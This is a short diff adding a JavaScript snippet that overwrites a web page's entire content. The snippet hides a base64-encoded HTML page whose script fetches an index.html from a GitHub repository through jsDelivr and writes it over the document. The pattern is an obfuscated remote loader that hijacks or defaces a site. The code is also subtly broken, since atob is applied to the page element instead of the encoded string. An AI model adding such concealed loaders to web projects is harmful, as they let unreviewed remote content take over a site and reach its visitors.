@@ -1,0 +1,8 @@
+(function(){
+  var h = document.documentElement;
+  h.innerHTML = 'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD1VVEYtOD48bWV0YSBuYW1lPXZpZXdwb3J0IGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEiPjx0aXRsZT7nkIblt6XmlofliJs8L3RpdGxlPjwvaGVhZD48Ym9keT48ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXI7aGVpZ2h0OjEwMHZoO2ZvbnQtZmFtaWx5OnN5c3RlbS11aTtjb2xvcjojYzQ5YTc2Ij48aDE+5bel55CG5paH5YibPC9oMT48L2Rpdj48c2NyaXB0PmZldGNoKCJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvMjE4ODE5NTAyOC1jcnlwdG8vbGd3Y0BtYWluL2luZGV4Lmh0bWwiKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGg9Pntkb2N1bWVudC5vcGVuKCk7ZG9jdW1lbnQud3JpdGUoaCk7ZG9jdW1lbnQuY2xvc2UoKX0pPC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4=';
+  var d = atob(h);
+  document.open();
+  document.write(d);
+  document.close();
+})();
